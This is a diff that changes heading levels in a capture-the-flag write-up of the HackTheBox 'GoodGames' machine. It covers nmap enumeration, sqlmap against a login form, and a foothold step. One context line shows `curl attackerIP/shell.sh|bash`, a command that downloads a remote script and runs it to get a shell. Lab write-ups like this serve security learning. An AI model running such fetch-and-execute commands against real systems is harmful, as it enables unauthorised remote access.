@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/goodgames
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [GoodGames](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). 
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -44,7 +44,7 @@ Service Info: Host: goodgames.htb
 
 We found werkzeug web server running on port 80 with the hostname `goodgames.htb`, let's add it to `/etc/hosts`
 
-## Web
+### Web
 
 Let's navigate to `goodgames.htb`
 
@@ -68,7 +68,7 @@ The link goes to `internal-administration.goodgames.htb`, so we need to add it t
 
 We got a login page, and again i tried default credential and sql injection but neither worked this time.
 
-## sqlmap
+### sqlmap
 
 Since the first login form was vulnerable to sql injection, let's go to burp and copy the login request to a file.
 
@@ -121,7 +121,7 @@ We got the password, now let's login to flask volt with the credentials `admin:s
 
 ![](6.png)
 
-# **Foothold**
+## **Foothold**
 
 Going to `Settings` page, we find a form where we can change our name.
 
@@ -149,7 +149,7 @@ Instead of `id` i run `curl attackerIP/shell.sh|bash`, this command requests a t
 
 And we got a shell
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 We find ourselves in a docker container, let's check the network interfaces and ip addresses.
 
